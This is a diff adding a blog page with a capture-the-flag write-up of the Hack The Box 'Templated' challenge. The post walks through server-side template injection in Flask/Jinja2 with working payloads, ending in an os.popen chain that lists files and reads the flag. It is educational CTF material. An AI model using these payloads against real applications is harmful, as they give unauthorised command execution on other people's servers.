@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>[HTB] Templated Writeup :: ngaih.tech</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This is my writeup for Hackthebox Templated Web Challenge. The challenge is fairly straight forward and is an easier challenge.
+Initial Analysis Visiting the ip address provided, we are greeted with site still under construction page with powered by Flask/Jinja2 text at the bottom.
+img: Site still under construction.
+Upon investigation we discover that Flask is a python web framework while Jinja2 is the templating engine utilised. Since the name of the challenge also includes templated we can be fairly certain that it has to do something with Server Side Template Injection." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/templated/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/android-chrome-512x512.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="ngaih.tech" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="[HTB] Templated Writeup">
+<meta property="og:description" content="This is my writeup for Hackthebox Templated Web Challenge. The challenge is fairly straight forward and is an easier challenge.
+Initial Analysis Visiting the ip address provided, we are greeted with site still under construction page with powered by Flask/Jinja2 text at the bottom.
+img: Site still under construction.
+Upon investigation we discover that Flask is a python web framework while Jinja2 is the templating engine utilised. Since the name of the challenge also includes templated we can be fairly certain that it has to do something with Server Side Template Injection." />
+<meta property="og:url" content="/posts/templated/" />
+<meta property="og:site_name" content="ngaih.tech" />
+
+  
+    <meta property="og:image" content="/android-chrome-512x512.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="hacking" />
+
+
+  <meta property="article:published_time" content="2023-01-14 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ngaih.tech
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/categories">Categories</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/categories">Categories</a></li>
+        
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/templated/">[HTB] Templated Writeup</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2023-01-14 ::
+        
+      </time>
+    
+    
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="/tags/write-up/">write up</a>&nbsp;
+      
+      #<a href="/tags/hack-the-box/">hack the box</a>&nbsp;
+      
+      #<a href="/tags/ssti/">ssti</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>This is my writeup for Hackthebox <a href="https://app.hackthebox.com/challenges/templated">Templated</a> Web Challenge. The challenge is fairly straight forward and is an easier challenge.</p>
+<h2 id="initial-analysis">Initial Analysis<a href="#initial-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Visiting the ip address provided, we are greeted with <code>site still under construction</code> page with powered by <code>Flask/Jinja2</code> text at the bottom.</p>
+<p><img src="/images/templated/templated1.png" alt="site still under"></p>
+<p><em>img: Site still under construction.</em></p>
+<p>Upon investigation we discover that <code>Flask</code> is a python web framework while <code>Jinja2</code> is the templating engine utilised. Since the name of the challenge also includes <code>template</code>d we can be fairly certain that it has to do something with <code>Server Side Template Injection</code>.</p>
+<blockquote>
+<p>Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. <a href="https://portswigger.net/web-security/server-side-template-injection#:~:text=What%20is%20server%2Dside%20template,fixed%20templates%20with%20volatile%20data.">PortSwigger.net</a></p>
+</blockquote>
+<p>SSTI basically allows us to exploit the templating engine to execute code and other payloads.</p>
+<h2 id="testing">Testing<a href="#testing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Let us test the url by injecting a plain text in the address bar of the browser.</p>
+<p><img src="/images/templated/templated2.png" alt="text"></p>
+<p>img: Text displayed on the screen.</p>
+<p>Now injecting a SSTI payload in the address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>}}
+</span></span></code></pre></div><p><img src="/images/templated/templated3.png" alt="text"></p>
+<p><em>img: Value of 2 displayed.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">.</span>upper()}}
+</span></span></code></pre></div><p>Let us try another python string method.</p>
+<p><img src="/images/templated/templated4.png" alt="text"></p>
+<p><em>img: String hello is capitalised.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">.</span>upper()}}
+</span></span></code></pre></div><p>Our goal is to exploit the template engine so that we can import the <code>os</code> library and make system calls on the servers.
+Here is a really good <a href="https://secure-cookie.io/attacks/ssti/">resource</a> on how to achieve this by leveraging python classes and modules.</p>
+<p>Using this code below, we look at the base class of the string and then list the subclasses derived from the base class.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()}}
+</span></span></code></pre></div><p><img src="/images/templated/templated5.png" alt="text"></p>
+<p>*img: executing python code.</p>
+<p>We parse through the subclasses listed in the above image and find the &lt;class &lsquo;warnings.catch_warnings&rsquo;&gt;. This subclass allows us to import the sys module and then later the os module. We can use some comma separated element parser to find the location of the <code>warnings</code>(it is 186 in our case) class and then write our exploit as below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">186</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;ls&#34;</span>)<span style="color:#f92672">.</span>read()}}n
+</span></span></code></pre></div><p><img src="/images/templated/templated6.png" alt="text"></p>
+<p>*img: We get the files listed by using the ls command.</p>
+<p>Since we can see that there is a flag.txt present in the directory. We can just execute <code>cat flag.txt</code> to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">186</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)<span style="color:#f92672">.</span>read()}}n
+</span></span></code></pre></div><blockquote>
+<p>The flag is HTB{t***************************************!}</p>
+</blockquote>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/phonebook/">
+                <span class="button__icon">←</span>
+                <span class="button__text">[HTB] Phonebook writeup</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/waybackmachine/">
+                <span class="button__text">Wayback Machine</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 ngaih.tech </a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
